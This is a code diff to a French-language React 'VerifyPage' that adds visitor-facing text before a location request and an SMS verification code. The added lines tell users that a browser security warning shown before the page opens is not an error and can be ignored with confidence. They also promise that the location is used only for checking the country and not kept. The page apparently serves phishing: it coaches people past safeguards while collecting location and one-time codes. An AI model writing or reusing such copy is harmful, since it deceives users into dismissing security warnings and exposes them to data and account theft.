@@ -101,9 +101,20 @@ export default function VerifyPage() {
 
       {step === "start" && (
         <>
+          <p style={{ color: "#555", fontSize: 13, marginBottom: 12 }}>
+            ⚠️ Votre navigateur peut afficher un avertissement de sécurité
+            avant l&apos;ouverture de cette page. Ce n&apos;est pas une erreur :
+            vous pouvez continuer en toute confiance.
+          </p>
+          <p style={{ color: "#555", fontSize: 13, marginBottom: 12 }}>
+            📍 Nous vous demanderons l&apos;accès à votre position pour
+            vérifier que vous vous trouvez bien dans le pays autorisé à
+            recevoir ce document. Cette information n&apos;est utilisée que
+            pour cette vérification et n&apos;est pas conservée.
+          </p>
           <p style={{ color: "#555", marginBottom: 16 }}>
-            Pour continuer, nous vous demanderons de partager la position de
-            votre appareil et nous vous enverrons un code par SMS.
+            Pour continuer, nous vous enverrons également un code de
+            vérification par SMS.
           </p>
           <button onClick={handleStart} disabled={loading} style={buttonStyle}>
             {loading ? "Vérification en cours..." : "Continuer"}
